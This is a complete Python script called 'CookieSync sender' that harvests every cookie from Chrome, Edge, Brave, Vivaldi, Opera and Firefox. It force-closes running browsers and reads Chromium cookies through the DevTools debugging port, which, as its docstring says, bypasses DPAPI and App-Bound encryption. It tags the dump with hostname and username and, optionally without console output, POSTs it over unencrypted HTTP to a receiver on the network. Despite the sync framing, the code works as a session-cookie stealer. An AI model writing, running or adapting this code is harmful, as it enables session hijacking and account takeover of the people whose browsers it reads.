#!/usr/bin/env python3
"""
CookieSync sender.

Runs on the SOURCE machine. Harvests cookies from every installed browser and
POSTs them to a receiver, or writes them to a local file.

Chromium browsers are read through the DevTools Protocol, which sidesteps
DPAPI, AES-GCM and App-Bound (v20) encryption entirely. Firefox is read with
browser_cookie3 because its values are not encrypted.

Usage:
    python sender.py                     # discover receiver on LAN
    python sender.py --host 192.168.1.50
    python sender.py --out cookies.json  # local only
"""

import argparse
import datetime
import json
import os
import pathlib
import socket
import subprocess
import sys
import time

try:
    import requests
    import websocket
    import browser_cookie3 as bc
except ImportError as exc:
    sys.exit(f"missing dependency ({exc}). Run: pip install -r requirements.txt")

REPO = pathlib.Path(__file__).resolve().parent.parent
CONF = REPO / "config.json"

DEFAULTS = {
    "host": "",
    "port": 8000,
    "token": "",
    "discovery": True,
    "discovery_port": 50505,
    "close_browsers": True,
    "debug_port": 9222,
}

# name, user-data-dir, executable, process name
CHROMIUM = [
    ("chrome",  r"%LOCALAPPDATA%\Google\Chrome\User Data",
                r"%PROGRAMFILES%\Google\Chrome\Application\chrome.exe", "chrome.exe"),
    ("edge",    r"%LOCALAPPDATA%\Microsoft\Edge\User Data",
                r"%PROGRAMFILES(x86)%\Microsoft\Edge\Application\msedge.exe", "msedge.exe"),
    ("brave",   r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",
                r"%PROGRAMFILES%\BraveSoftware\Brave-Browser\Application\brave.exe", "brave.exe"),
    ("vivaldi", r"%LOCALAPPDATA%\Vivaldi\User Data",
                r"%LOCALAPPDATA%\Vivaldi\Application\vivaldi.exe", "vivaldi.exe"),
    ("opera",   r"%APPDATA%\Opera Software\Opera Stable",
                r"%LOCALAPPDATA%\Programs\Opera\opera.exe", "opera.exe"),
]

CFG = dict(DEFAULTS)


def log(msg, quiet=False):
    if not quiet:
        print(msg, flush=True)


def load_conf():
    if CONF.exists():
        try:
            CFG.update(json.loads(CONF.read_text("utf-8")))
        except Exception as exc:
            print(f"[!] config.json unreadable, using defaults: {exc}")


def expand(path):
    return os.path.expandvars(path)


def discover(timeout=3.0):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(0.4)

    payload = b"COOKIESYNC_DISCOVER"
    targets = [("255.255.255.255", CFG["discovery_port"]), ("127.0.0.1", CFG["discovery_port"])]
    for target in targets:
        try:
            sock.sendto(payload, target)
        except OSError:
            pass

    found, seen, deadline = [], set(), time.time() + timeout
    while time.time() < deadline:
        try:
            data, addr = sock.recvfrom(1024)
        except socket.timeout:
            continue
        if not data.startswith(b"COOKIESYNC_HERE "):
            continue
        try:
            info = json.loads(data.split(b" ", 1)[1])
        except Exception:
            continue
        key = (info.get("ip"), info.get("port"))
        if key in seen:
            continue
        seen.add(key)
        found.append(info)
    sock.close()
    return found


def running_processes():
    try:
        out = subprocess.run(["tasklist", "/fo", "csv", "/nh"], capture_output=True,
                             text=True, timeout=20).stdout.lower()
    except Exception:
        return set()
    names = {name for _, _, _, name in CHROMIUM}
    names.add("firefox.exe")
    return {n for n in names if n in out}


def kill(name):
    subprocess.run(["taskkill", "/f", "/im", name], capture_output=True)


def profiles(user_data_dir):
    root = pathlib.Path(expand(user_data_dir))
    if not root.is_dir():
        return []
    return [p.name for p in root.iterdir()
            if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile "))]


def cdp_dump(exe, user_data_dir, profile, errors, quiet):
    """Harvest one profile through DevTools. Returns a list of cookie dicts."""
    exe, udd = expand(exe), expand(user_data_dir)
    if not os.path.isfile(exe) or not os.path.isdir(udd):
        return []

    port = int(CFG["debug_port"])
    proc = subprocess.Popen(
        [exe, f"--remote-debugging-port={port}", f"--user-data-dir={udd}",
         f"--profile-directory={profile}", "--no-first-run", "--no-default-browser-check"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    ws = None
    try:
        version = None
        for _ in range(40):
            try:
                version = requests.get(f"http://127.0.0.1:{port}/json/version", timeout=1).json()
                if version.get("webSocketDebuggerUrl"):
                    break
            except Exception:
                pass
            time.sleep(0.4)
        if not version or not version.get("webSocketDebuggerUrl"):
            errors.append(f"{os.path.basename(exe)}: debug port never opened (browser still running?)")
            return []

        ws = websocket.create_connection(version["webSocketDebuggerUrl"], timeout=25)
        ws.send(json.dumps({"id": 1, "method": "Network.enable"}))
        ws.recv()
        ws.send(json.dumps({"id": 2, "method": "Network.getAllCookies"}))
        deadline = time.time() + 25
        while time.time() < deadline:
            msg = json.loads(ws.recv())
            if msg.get("id") != 2:
                continue
            raw = msg.get("result", {}).get("cookies", [])
            return [{"domain": c.get("domain"), "name": c["name"], "value": c["value"],
                     "path": c.get("path"), "secure": c.get("secure"),
                     "expires": c.get("expires")} for c in raw]
        errors.append(f"{os.path.basename(exe)}/{profile}: no response from DevTools")
        return []
    except Exception as exc:
        errors.append(f"{os.path.basename(exe)}/{profile}: {exc}")
        return []
    finally:
        if ws is not None:
            try:
                ws.close()
            except Exception:
                pass
        subprocess.run(["taskkill", "/f", "/t", "/pid", str(proc.pid)], capture_output=True)


def collect(quiet=False):
    result, errors = {}, []

    if CFG["close_browsers"]:
        live = running_processes()
        if live:
            log(f"[*] closing browsers: {', '.join(sorted(live))}", quiet)
            for name in live:
                kill(name)
            time.sleep(2)

    try:
        jar = bc.firefox()
        rows = [{"domain": c.domain, "name": c.name, "value": c.value,
                 "path": c.path, "secure": c.secure, "expires": c.expires} for c in jar]
        if rows:
            result["firefox"] = rows
            log(f"[*] firefox: {len(rows)}", quiet)
    except Exception as exc:
        errors.append(f"firefox: {exc}")

    for name, udd, exe, _ in CHROMIUM:
        total = []
        for profile in profiles(udd):
            total.extend(cdp_dump(exe, udd, profile, errors, quiet))
        if total:
            result[name] = total
            log(f"[*] {name}: {len(total)}", quiet)

    if errors:
        result["_errors"] = errors
    result["_meta"] = {"host": socket.gethostname(), "user": os.environ.get("USERNAME"),
                       "time": datetime.datetime.now().isoformat()}
    return result


def main():
    parser = argparse.ArgumentParser(description="CookieSync sender")
    parser.add_argument("--host")
    parser.add_argument("--port", type=int)
    parser.add_argument("--token")
    parser.add_argument("--out")
    parser.add_argument("--discovery-port", type=int)
    parser.add_argument("--no-close-browsers", action="store_true")
    parser.add_argument("--list-hosts", action="store_true")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    load_conf()
    if args.host:
        CFG["host"] = args.host
    if args.port:
        CFG["port"] = args.port
    if args.token is not None:
        CFG["token"] = args.token
    if args.discovery_port:
        CFG["discovery_port"] = args.discovery_port
    if args.no_close_browsers:
        CFG["close_browsers"] = False

    if args.list_hosts:
        hosts = discover()
        if not hosts:
            print("no receivers found")
        for h in hosts:
            print(f"{h.get('ip')}:{h.get('port')}  {h.get('name')}")
        return 0

    if not CFG["host"]:
        log("[*] discovering receiver...", args.quiet)
        hosts = discover()
        if not hosts:
            print("[!] no receiver found. Start it on the other PC, or pass --host.")
            return 1
        if len(hosts) > 1:
            log(f"[*] {len(hosts)} receivers found, using the first", args.quiet)
        CFG["host"] = hosts[0]["ip"]
        CFG["port"] = hosts[0]["port"]

    data = collect(args.quiet)
    total = sum(len(v) for k, v in data.items() if not k.startswith("_"))
    payload = json.dumps(data, indent=1).encode()

    if args.out:
        pathlib.Path(args.out).write_bytes(payload)
        log(f"[+] wrote {total} cookies to {args.out}", args.quiet)
        return 0

    url = f"http://{CFG['host']}:{CFG['port']}/cookies"
    headers = {"X-Token": CFG["token"]} if CFG["token"] else {}
    log(f"[*] posting {total} cookies to {url}", args.quiet)
    try:
        resp = requests.post(url, data=payload, headers=headers, timeout=120)
    except Exception as exc:
        print(f"[!] send failed: {exc}")
        return 1

    if resp.status_code != 200:
        print(f"[!] receiver returned {resp.status_code}: {resp.text.strip()}")
        return 1

    log(f"[+] done: {total} cookies delivered", args.quiet)
    return 0


if __name__ == "__main__":
    sys.exit(main())